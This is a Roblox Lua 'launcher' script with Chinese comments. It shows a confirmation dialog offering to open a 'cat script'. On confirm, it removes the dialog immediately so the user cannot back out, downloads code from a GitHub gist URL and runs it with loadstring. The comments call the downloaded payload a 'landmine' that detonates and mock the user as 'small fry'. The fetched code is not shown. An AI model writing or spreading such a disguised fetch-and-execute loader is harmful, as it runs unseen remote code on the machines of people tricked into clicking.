-- [[ Neko Pure Confirmation Launcher - 消失版 ]]
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- 1. 介面外殼
local sg = Instance.new("ScreenGui", CoreGui)
sg.Name = "NekoConfirmUI"

local frame = Instance.new("Frame", sg)
frame.Size = UDim2.new(0, 300, 0, 160)
frame.Position = UDim2.new(0.5, -150, 0.5, -80)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- 粉色發光邊框（增加吸引力喵）
local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(255, 105, 180)
stroke.Thickness = 2

-- 2. 標題文字
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0.5, 0)
title.BackgroundTransparency = 1
title.Text = "確認開啟貓腳本？"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 22

-- 3. 確認按鈕（點了直接蒸發並啟動）
local yes = Instance.new("TextButton", frame)
yes.Size = UDim2.new(0, 120, 0, 45)
yes.Position = UDim2.new(0.08, 0, 0.55, 0)
yes.BackgroundColor3 = Color3.fromRGB(255, 105, 180)
yes.Text = "確認"
yes.TextColor3 = Color3.new(1, 1, 1)
yes.Font = Enum.Font.GothamBold
yes.TextSize = 18
Instance.new("UICorner", yes)

-- 4. 取消按鈕
local no = Instance.new("TextButton", frame)
no.Size = UDim2.new(0, 120, 0, 45)
no.Position = UDim2.new(0.52, 0, 0.55, 0)
no.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
no.Text = "取消"
no.TextColor3 = Color3.fromRGB(180, 180, 180)
no.Font = Enum.Font.GothamBold
no.TextSize = 18
Instance.new("UICorner", no)

-- [[ 核心啟動邏輯 ]]

yes.MouseButton1Click:Connect(function()
    -- 第一步：立刻消失視窗，讓雜魚沒機會後悔
    sg:Destroy()
    
    -- 第二步：專心在背景跑連結
    task.spawn(function()
        local url = "https://gist.githubusercontent.com/nekooocattt-NEKO/7e81681a90c5b97a61b8e90d1eedcf7b/raw/B"
        local success, content = pcall(function()
            return game:HttpGet(url .. "?cache=" .. tick()) -- 防止緩存，保證拿到最新地雷
        end)
        
        if success and content then
            local func, err = loadstring(content)
            if func then
                func() -- 蹦！地雷引爆喵
            end
        end
    end)
end)

no.MouseButton1Click:Connect(function()
    sg:Destroy()
end)

-- 讓框框可以拖動
local dragging, dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true; dragStart = input.Position; startPos = frame.Position
    end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
game:GetService("UserInputService").InputEnded:Connect(function() dragging = false end)
